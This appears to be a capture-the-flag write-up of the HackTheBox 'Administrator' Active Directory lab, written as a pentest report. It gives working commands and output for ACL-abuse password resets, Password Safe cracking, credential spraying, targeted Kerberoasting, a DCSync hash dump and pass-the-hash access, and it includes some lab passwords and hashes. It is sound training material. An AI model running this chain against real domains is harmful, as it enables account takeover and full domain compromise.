+++
title = "Administrator-CPTS-Prep-Box-Writeup.md"
date = 2026-02-20T00:00:00Z
draft = false
description = "Administrator is a medium-difficulty Windows Active Directory machine featuring ACL abuse, password reset chaining, Password Safe database cracking, targeted Kerberoasting, and DCSync privileges for full domain compromise"
tags = ["CPTS", "HTB", "Administrator", "CPTS Prep", "Active Directory", "ACL Abuse", "Password Reset", "Password Safe", "Targeted Kerberoasting", "DCSync"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "administrator.htb" (`10.129.24.48`). The assessment began from an assumed breach scenario, providing the tester with low-privileged credentials for the domain user `olivia`. The objective was to evaluate the potential impact of a compromised end-user account and identify escalation paths to full domain compromise.

The test successfully demonstrated a complete attack chain, moving from initial low-privileged access to domain administrator privileges through a series of ACL abuses and credential discoveries. The following key findings were identified:

- **Initial Access:** The provided credentials for `olivia` were validated, providing WinRM access to the domain controller.

- **ACL Abuse - Password Reset (Olivia → Michael):** BloodHound enumeration revealed that `olivia` had `GenericAll` permissions over the user `michael`. This was abused to reset `michael`'s password, granting access to a new user account.

- **ACL Abuse - Password Reset (Michael → Benjamin):** Further enumeration showed that `michael` could force a password change on the user `benjamin`. This was abused to reset `benjamin`'s password.

- **FTP Access and Password Safe Database:** The user `benjamin` had access to an FTP share containing a Password Safe database (`Backup.psafe3`). The file was downloaded and its password hash was extracted and cracked.

- **Credential Spraying:** The cracked database revealed multiple credentials. Spraying these across the domain identified valid credentials for the user `emily`.

- **Targeted Kerberoasting (Emily → Ethan):** BloodHound revealed that `emily` had `GenericWrite` permissions over the user `ethan`. This was abused to perform a targeted Kerberoasting attack, obtaining and cracking a TGS hash for `ethan`.

- **DCSync Privileges:** The user `ethan` was found to have `DCSync` rights, allowing extraction of all domain hashes, including the `Administrator` account.

- **Domain Compromise:** With the `Administrator` hash, a WinRM session was established, achieving full domain compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker starting with a standard user account was able to navigate through multiple ACL relationships, reset passwords, crack a Password Safe database, and ultimately leverage DCSync privileges to obtain the `Administrator` hash.

**Recommendations:**

- **Review and Harden ACLs:** Conduct a thorough review of all ACLs within Active Directory, removing overly permissive rights such as `GenericAll` and `GenericWrite` from non-privileged users.
- **Implement Strong Password Policies:** Ensure all users have complex passwords that resist cracking attempts.
- **Secure FTP Access:** FTP shares should not contain sensitive files like password databases. Use secure protocols and implement access controls.
- **Monitor DCSync Attempts:** Enable logging and monitoring for DCSync attacks, which indicate attempts to replicate directory services.
- **Principle of Least Privilege:** Users should not have unnecessary privileges like password reset rights over other users or DCSync permissions.

## Machine Information

As is common in real-life Windows pentests, you will start the Administrator box with credentials for the following account: `Olivia` / `<REDACTED>`

## About

`Administrator` is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a targeted port scan of the domain controller.

```bash
# Nmap 7.94SVN scan initiated Thu Nov 27 17:22:55 2025 as: nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v -Pn -sVC -oN nmap_sVC.txt 10.129.24.48
Nmap scan report for DC.administrator.htb (10.129.24.48)
Host is up (0.24s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-27 17:23:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m02s
| smb2-time: 
|   date: 2025-11-27T17:23:24
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 27 17:23:36 2025 -- 1 IP address (1 host up) scanned in 41.31 seconds

```

**Findings:** The scan revealed a Windows Domain Controller with standard AD ports open, including FTP (21/tcp) and WinRM (5985/tcp). The domain was identified as `administrator.htb`.

**2. Credential Validation**  
The provided credentials were validated against the domain controller.

```bash
❯ nxc winrm 10.129.24.48 -u 'Olivia' -p 'ichliebedich'
WINRM       10.129.24.48    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.24.48    5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)

 ~honeypoop/HTB/C/A/03-Attack-Chains                       

```

**Findings:** The credentials were valid and provided WinRM access (Pwn3d!).


### Phase 2: ACL Enumeration and Initial Password Reset

**3. BloodHound Enumeration**  
BloodHound was used to map Active Directory relationships and identify potential privilege escalation paths.

**Findings:** BloodHound revealed that `olivia` had `GenericAll` permissions over the user `michael`.

**4. Password Reset (Olivia → Michael)**  
The `GenericAll` privilege was abused to reset `michael`'s password.

```bash
❯ bloodyAD -d administrator.htb -u Olivia -p 'ichliebedich' --host dc.administrator.htb set password Michael 'NewPass123!'
[+] Password changed successfully!
```

**5. Credential Validation for Michael**  
The new password was validated against the domain controller.
```bash
❯ nxc smb 10.129.24.48 -u michael -p 'NewPass123!'
SMB         10.129.24.48    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.24.48    445    DC               [+] administrator.htb\michael:NewPass123!

❯ nxc winrm 10.129.24.48 -u michael -p 'NewPass123!'
WINRM       10.129.24.48    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.24.48    5985   DC               [+] administrator.htb\michael:NewPass123! (Pwn3d!)
```
**Findings:** The credentials were valid and provided WinRM access.

### Phase 3: Second Password Reset

**6. ACL Analysis for Michael**  
Further BloodHound analysis revealed that `michael` could force a password change on the user `benjamin`.

**7. Password Reset (Michael → Benjamin)**  
The password for `benjamin` was reset using bloodyAD.
```bash 
❯ bloodyAD -d administrator.htb -u Michael -p 'NewPass123!' --host dc.administrator.htb set password Benjamin 'NewPass123!'
[+] Password changed successfully!
```


**8. Credential Validation for Benjamin**  
The new password was validated against FTP service.

```bash
❯ nxc winrm 10.129.24.48 -u Benjamin -p 'NewPass123!'
WINRM       10.129.24.48    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\Benjamin:NewPass123!
❯ nxc smb 10.129.24.48 -u Benjamin -p 'NewPass123!'
SMB         10.129.24.48    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.24.48    445    DC               [+] administrator.htb\Benjamin:NewPass123!
❯ nxc ftp 10.129.24.48 -u Benjamin -p 'NewPass123!'
FTP         10.129.24.48    21     10.129.24.48     [+] Benjamin:NewPass123!

```
**Findings:** The credentials were valid for FTP access.

### Phase 4: FTP Access and Password Safe Database

**9. FTP Enumeration**  
The FTP share was enumerated to identify interesting files.

```bash
❯ nxc ftp 10.129.24.48 -u Benjamin -p 'NewPass123!' --ls
FTP         10.129.24.48    21     10.129.24.48     [+] Benjamin:NewPass123!
FTP         10.129.24.48    21     10.129.24.48     [*] Directory Listing
FTP         10.129.24.48    21     10.129.24.48     10-05-24  08:13AM                  952 Backup.psafe3
```

**Findings:** A Password Safe database file `Backup.psafe3` was discovered.

**10. File Download**  
The database file was downloaded for offline analysis.
```bash
❯ nxc ftp 10.129.24.48 -u Benjamin -p 'NewPass123!' --get Backup.psafe3
FTP         10.129.24.48    21     10.129.24.48     [+] Benjamin:NewPass123!
FTP         10.129.24.48    21     10.129.24.48     [+] Downloaded: Backup.psafe3
❯ file Backup.psafe3
Backup.psafe3: Password Safe V3 database

```
**Findings:** The file was confirmed to be a Password Safe V3 database.

### Phase 5: Password Safe Database Cracking

**11. Hash Extraction**  
The password hash was extracted from the Password Safe database.
```bash
psafe2john Backup.psafe3 > psafe3-hash.txt
```

**12. Password Cracking**  
The hash was cracked using john with the rockyou wordlist.

```bash 
❯ john psafe3-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>    (Backu)
1g 0:00:00:00 DONE (2025-11-28 01:13) 6.250g/s 102400p/s 102400c/s 102400C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

 ~honeypoop/HTB/C/A/03-Attack-Chains        
```

**Findings:** The password was successfully cracked: `<REDACTED>`.

**13. Database Contents**  
The Password Safe database contained multiple credentials:

| Username  | Password                 |
| --------- | ------------------------ |
| alexander | `<REDACTED>`             |
| emily     | `<REDACTED>`             |
| emma      | `<REDACTED>`             |
| alexander | `<REDACTED>` (alternate) |
| emily     | `<REDACTED>` (valid)     |
| emma      | `<REDACTED>`             |

### Phase 6: Credential Spraying

**14. Credential Spraying**  
The extracted credentials were sprayed across the domain to identify valid accounts.

```bash
❯ nxc smb 10.129.24.48 -u users -p pass --continue-on-success
SMB         10.129.24.48    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.24.48    445    DC               [-] administrator.htb\alexander:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.24.48    445    DC               [-] administrator.htb\emily:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.24.48    445    DC               [-] administrator.htb\emma:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.24.48    445    DC               [-] administrator.htb\alexander:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.24.48    445    DC               [+] administrator.htb\emily:<REDACTED>
SMB         10.129.24.48    445    DC               [-] administrator.htb\emma:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.24.48    445    DC               [-] administrator.htb\alexander:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.24.48    445    DC               [-] administrator.htb\emma:<REDACTED> STATUS_LOGON_FAILURE


❯ nxc winrm 10.129.24.48 -u users -p pass --continue-on-success
WINRM       10.129.24.48    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\alexander:<REDACTED>
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\emily:<REDACTED>
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\emma:<REDACTED>
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\alexander:<REDACTED>
WINRM       10.129.24.48    5985   DC               [+] administrator.htb\emily:<REDACTED> (Pwn3d!)
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\emma:<REDACTED>
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\alexander:<REDACTED>
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\emma:<REDACTED>
```

**Findings:** The credentials for `emily` with password `<REDACTED>` were valid and provided WinRM access.

### Phase 7: Targeted Kerberoasting

**15. BloodHound Analysis for Emily**  
BloodHound revealed that `emily` had `GenericWrite` permissions over the user `ethan`.

**16. Targeted Kerberoasting**  
Using the `emily` account, a targeted Kerberoasting attack was performed to request a service ticket for `ethan`.

```bash 
❯ ./targetedKerberoast.py -v -d 'administrator.htb' -u emily -p <REDACTED>
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$d4e5706f9e6d734f6fc712b259bbc852$1fe7d729778549dc99298cec88d324e65bb3acd2a769365fa17509f7a<REDACTED>cd9a0373d7d71934dec63669de1e3fe4c19abb8b60cf27e44c5d8ae79723e4599c5aaf0ea5c67520b7e8c1d271cd18fdc4cdba198b00f74af93a71d162d95dac6f6250f8da517
[VERBOSE] SPN removed successfully for (ethan)

 /opt/targetedKerberoast  main !1              
```


**17. Hash Cracking**  
The TGS hash was cracked using hashcat with the rockyou wordlist.

```bash 
❯ hashcat ethan_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 7435HS, 6851/13767 MB (2048 MB allocatable), 16MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$d4e5706f9e6d73<REDACTED>cd9a0373d7d71934dec63669de1e3fe4c19abb8b60cf27e44c5d8ae79723e4599c5aaf0ea5c67520b7e8c1d271cd18fdc4cdba198b00f74af93a71d162d95dac6f6250f8da517:<REDACTED>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....8da517
Time.Started.....: Fri Nov 28 01:26:12 2025 (1 sec)
Time.Estimated...: Fri Nov 28 01:26:13 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4264.5 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> cocoliso
Hardware.Mon.#1..: Temp: 58c Util:  9%

Started: Fri Nov 28 01:26:11 2025
Stopped: Fri Nov 28 01:26:14 2025
```

**Findings:** The password for `ethan` was successfully cracked: `<REDACTED>`.

**18. Credential Validation for Ethan**  
The cracked credentials were validated against the domain.

```bash 
❯ nxc winrm 10.129.24.48 -u ethan -p <REDACTED>
WINRM       10.129.24.48    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.24.48    5985   DC               [-] administrator.htb\ethan:limpbiz<REDACTED>kit

❯ nxc smb 10.129.24.48 -u ethan -p <REDACTED>
SMB         10.129.24.48    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.24.48    445    DC               [+] administrator.htb\ethan:<REDACTED>

 ~honeypoop/HTB/C/A/03-Attack-Chains        
```

**Findings:** The credentials were valid for SMB access.


### Phase 8: DCSync Attack

**19. BloodHound Analysis for Ethan**  
BloodHound revealed that `ethan` had `DCSync` rights, allowing replication of directory services.

**20. Secretsdump with DCSync**  
The `DCSync` privilege was abused using secretsdump to extract all domain hashes.
```bash 
❯ secretsdump.py 'adminstrator.htb'/'ethan':'<REDACTED>'@administrator.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:615a7b6664f0bfc7160e1d3cfe1ca134ffdacaa656ccddd7167aa283c8b211e0
administrator.htb\michael:aes128-cts-hmac-sha1-96:4374c22e248e847055a39bd1d18cf90b
administrator.htb\michael:des-cbc-md5:cbcb10e05210bc51
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:3e2ad3748befe7d37e09d531f546a4378a9a5c3fc896847967cb809be66de907
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:ac2859f4e518f43820a2f739409087af
administrator.htb\benjamin:des-cbc-md5:5dc4f43b1a792cce
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...

 ~honeypoop/HTB/C/A/03-Attack-Chains                  
```
**Findings:** The NT hash for the `Administrator` account was obtained: `<REDACTED_ADMIN_HASH>`.

### Phase 9: Domain Administrator Access

**21. WinRM as Administrator**  
The Administrator hash was used to establish a WinRM session.

**22. Root Flag Retrieval**  
With administrative access, the root flag was retrieved.

```bash 
❯ evil-winrm -i 10.129.24.48 -u administrator --hash <REDACTED_ADMIN_HASH>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> tree
Folder PATH listing
Volume serial number is 6131-DE70
C:.
No subfolders exist

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/27/2025   9:17 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\Administrator\Desktop>

```

## Key Takeaways

- **ACL Abuse Chains:** Complex chains of ACL relationships can lead from a low-privileged user to full domain compromise. Each privilege should be carefully reviewed.
    
- **Password Reset Privileges:** The ability to reset other users' passwords (`ForceChangePassword`, `GenericAll`) is a powerful privilege that can lead to account takeovers.
    
- **Password Safe Databases:** Password Safe databases are only as secure as their master password; weak passwords can be cracked, exposing all stored credentials.
    
- **Targeted Kerberoasting:** `GenericWrite` privileges can be abused to add SPNs to users and perform targeted Kerberoasting attacks.
    
- **DCSync Privilege:** Users with `DCSync` rights can effectively compromise the entire domain by extracting all password hashes.
    
- **Credential Spraying:** Extracted credentials should be tested across all users, as password reuse is common.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
